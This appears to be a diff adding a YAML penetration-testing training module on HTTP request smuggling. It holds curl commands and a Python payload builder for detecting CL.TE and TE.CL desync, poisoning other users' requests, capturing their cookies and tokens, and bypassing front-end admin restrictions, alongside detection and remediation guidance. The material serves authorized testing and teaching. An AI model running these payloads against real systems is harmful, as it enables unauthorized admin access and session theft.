@@ -1,0 +1,200 @@
+# Category: Web Application Security - HTTP Request Smuggling
+name: "HTTP Request Smuggling Testing"
+id: "web-http-smuggling-001"
+category: "web_application"
+subcategory: "http_desync"
+difficulty: "advanced"
+estimated_time: "60"
+
+tags:
+  - web-application
+  - http-smuggling
+  - desync
+  - cl-te
+  - te-cl
+  - te-te
+  - burp-suite
+  - frontend-backend
+  - http1
+  - owasp
+  - request-smuggling
+  - cache-bypass
+  - mitre-t1190
+  - pentest
+  - red-team
+
+description: |
+  Test for HTTP request smuggling (desync) vulnerabilities where discrepancies
+  between front-end and back-end HTTP parsers allow attackers to interfere with
+  other users' requests. Covers CL.TE, TE.CL, and TE.TE variants.
+
+learning_objectives:
+  - Understand how front-end/back-end parsing discrepancies enable smuggling
+  - Detect CL.TE and TE.CL smuggling using timing and differential responses
+  - Exploit smuggling to poison other users' requests
+  - Bypass security controls using smuggled requests
+
+tools:
+  - "burp_suite"
+  - "http_request_smuggler"
+  - "curl"
+  - "python3"
+
+prerequisites:
+  - "Burp Suite with HTTP Request Smuggler extension"
+  - "Target application using layered HTTP architecture (CDN + origin)"
+  - "Understanding of HTTP/1.1 Transfer-Encoding and Content-Length"
+  - "Written authorization from target owner"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify front-end/back-end HTTP architecture"
+    commands:
+      - "# Check for load balancer / proxy headers"
+      - "curl -sI 'http://[target_url]/' | grep -iE 'via|x-forwarded|x-real-ip|server|x-powered'"
+      - "# Check HTTP/1.1 vs HTTP/2 support"
+      - "curl -sI --http1.1 'https://[target_url]/' | grep -i 'HTTP'"
+      - "curl -sI --http2 'https://[target_url]/' | grep -i 'HTTP'"
+      - "# Identify if front-end downgrades HTTP/2 to HTTP/1.1 to backend"
+      - "openssl s_client -connect [target_domain]:443 -alpn h2 2>/dev/null | grep 'ALPN'"
+    expected_output: "Proxy chain identification, HTTP version support, backend server headers"
+    detection: "Baseline request profiling — no anomaly at this stage"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Detect CL.TE smuggling via timing technique"
+    commands:
+      - "# CL.TE: Frontend uses Content-Length, Backend uses Transfer-Encoding"
+      - "# Send request where TE body has incomplete chunk — backend hangs waiting"
+      - "# Using curl with manual headers (time the response)"
+      - "time curl -s -X POST 'http://[target_url]/' -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' -H 'Connection: keep-alive' --data $'3\\r\\nabc\\r\\nX' --http1.1 --max-time 10"
+      - "# If response takes ~10 seconds — CL.TE confirmed (backend waiting for rest of chunk)"
+      - "# Using Burp Suite HTTP Request Smuggler extension:"
+      - "# Right-click request > Extensions > HTTP Request Smuggler > Smuggle probe"
+    expected_output: "~10 second delay on CL.TE probe confirms vulnerable desync configuration"
+    detection: "Incomplete chunked requests in backend access logs; connection timeout anomalies"
+
+  - id: "step3"
+    phase: "enumeration"
+    action: "Detect TE.CL smuggling via timing technique"
+    commands:
+      - "# TE.CL: Frontend uses Transfer-Encoding, Backend uses Content-Length"
+      - "# Send large Content-Length — backend reads partial body and hangs"
+      - "time curl -s -X POST 'http://[target_url]/' \\"
+      - "  -H 'Content-Length: 3' \\"
+      - "  -H 'Transfer-Encoding: chunked' \\"
+      - "  -H 'Connection: keep-alive' \\"
+      - "  --data $'0\\r\\n\\r\\nX' \\"
+      - "  --http1.1 --max-time 10"
+      - "# If ~10 sec delay — TE.CL confirmed"
+      - "# Confirmation via differential response (use cache buster)"
+      - "curl -s -X POST 'http://[target_url]/?cb=1' -H 'Content-Length: 4' -H 'Transfer-Encoding: chunked' --data $'0\\r\\n\\r\\nGARB' --http1.1"
+    expected_output: "Timing delay or 400/500 error on follow-up request confirms TE.CL"
+    detection: "Malformed chunked encoding in proxy logs; backend receiving partial requests"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Exploit CL.TE to poison next user request"
+    commands:
+      - "# CL.TE poison — prefix GET /admin to next user request"
+      - "# Request that smuggles a partial GET to backend"
+      - "curl -s -X POST 'http://[target_url]/' \\"
+      - "  -H 'Content-Length: 30' \\"
+      - "  -H 'Transfer-Encoding: chunked' \\"
+      - "  -H 'Connection: keep-alive' \\"
+      - "  --data $'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nX-Ignore: X' \\"
+      - "  --http1.1"
+      - "# Follow immediately with normal request (becomes smuggled request)"
+      - "curl -s 'http://[target_url]/' --http1.1"
+      - "# If response shows /admin content — smuggling confirmed"
+    expected_output: "Next request returns /admin response — other users' requests poisoned"
+    detection: "Backend logs showing /admin requests originating from unexpected connections"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Capture other users' requests via smuggling"
+    commands:
+      - "# Smuggle a partial POST that captures the next user's request in body"
+      - "# The next user's request appends to our smuggled POST body"
+      - "# First: create a storage endpoint to receive captured data"
+      - "# Then smuggle: POST /store HTTP/1.1 with large Content-Length"
+      - "python3 << 'EOF'\nimport socket, time\n\ndef send_smuggle(host, path):\n    smuggle_body = (\n        'POST /store HTTP/1.1\\r\\n'\n        f'Host: {host}\\r\\n'\n        'Content-Type: application/x-www-form-urlencoded\\r\\n'\n        'Content-Length: 400\\r\\n'\n        'Connection: keep-alive\\r\\n'\n        '\\r\\n'\n        'data='\n    )\n    outer = (\n        f'POST {path} HTTP/1.1\\r\\n'\n        f'Host: {host}\\r\\n'\n        'Content-Length: 0\\r\\n'\n        'Transfer-Encoding: chunked\\r\\n'\n        'Connection: keep-alive\\r\\n'\n        '\\r\\n'\n        f'{hex(len(smuggle_body))[2:]}\\r\\n'\n        f'{smuggle_body}\\r\\n'\n        '0\\r\\n\\r\\n'\n    )\n    print('Smuggle payload constructed')\n    print(outer[:200])\n\nsend_smuggle('[target_domain]', '/')\nEOF"
+    expected_output: "Next user's request (including cookies/tokens) appended to captured POST body"
+    detection: "Unexpected POST to /store endpoint; requests with abnormally large bodies in logs"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Bypass front-end security controls via smuggling"
+    commands:
+      - "# Bypass IP restriction: frontend blocks /admin, smuggle directly to backend"
+      - "curl -s -X POST 'http://[target_url]/' \\"
+      - "  -H 'Content-Length: 116' \\"
+      - "  -H 'Transfer-Encoding: chunked' \\"
+      - "  --data $'0\\r\\n\\r\\nGET /admin/deleteUser?username=carlos HTTP/1.1\\r\\nHost: [target_domain]\\r\\nContent-Length: 10\\r\\n\\r\\n0123456789' \\"
+      - "  --http1.1"
+      - "# Bypass header-based auth"
+      - "curl -s -X POST 'http://[target_url]/' \\"
+      - "  -H 'Content-Length: 130' \\"
+      - "  -H 'Transfer-Encoding: chunked' \\"
+      - "  --data $'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\nX-Internal-Auth: true\\r\\nContent-Length: 5\\r\\n\\r\\n12345' \\"
+      - "  --http1.1"
+    expected_output: "Access to protected admin endpoints via smuggled internal-only headers"
+    detection: "Backend access logs showing /admin requests without corresponding front-end auth"
+
+compliance_controls:
+  - standard: "OWASP Top 10 2021"
+    control: "A05:2021"
+    description: "Security Misconfiguration — HTTP processing discrepancy"
+  - standard: "OWASP ASVS v4.0"
+    control: "14.5.1"
+    description: "HTTP request validation and normalization"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent web application attacks"
+
+detection:
+  network_indicators:
+    - "Requests with both Content-Length and Transfer-Encoding headers"
+    - "Chunked requests with obfuscated Transfer-Encoding header value"
+    - "Unusually large Content-Length on responses to GET requests"
+  log_indicators:
+    - "Backend access logs showing requests without matching front-end logs"
+    - "400 errors on requests that appear valid at the front-end"
+    - "Admin endpoint access from non-admin source in backend logs"
+  endpoint_indicators:
+    - "HTTP desync detected by WAF or security proxy"
+    - "Connection reuse anomalies in backend application logs"
+
+remediation:
+  immediate:
+    - "Disable back-end connection reuse (HTTP keep-alive to backend)"
+    - "Normalize ambiguous Transfer-Encoding headers at front-end"
+    - "Reject requests with both Content-Length and Transfer-Encoding"
+  long_term:
+    - "Upgrade to HTTP/2 end-to-end (eliminates CL/TE ambiguity)"
+    - "Configure front-end proxy to normalize all HTTP/1.1 requests before forwarding"
+    - "Deploy WAF rules detecting simultaneous CL and TE headers"
+    - "Regular HTTP desync testing in penetration test methodology"
+
+variables:
+  target_url: "http://target.example.com"
+  target_domain: "target.example.com"
+
+assessment_questions:
+  - "What causes HTTP request smuggling — what parsing discrepancy is exploited?"
+  - "How does the timing technique detect CL.TE vs TE.CL vulnerabilities?"
+  - "Why does upgrading to HTTP/2 end-to-end eliminate request smuggling?"
+  - "How can request smuggling be used to bypass front-end security controls?"
+  - "What Burp Suite extension automates HTTP request smuggling detection?"
+
+references:
+  - url: "https://portswigger.net/web-security/request-smuggling"
+    title: "PortSwigger HTTP Request Smuggling"
+  - url: "https://github.com/PortSwigger/http-request-smuggler"
+    title: "HTTP Request Smuggler Burp Extension"
+  - url: "https://nathandavison.com/blog/haproxy-http-request-smuggling"
+    title: "HTTP Smuggling in HAProxy"
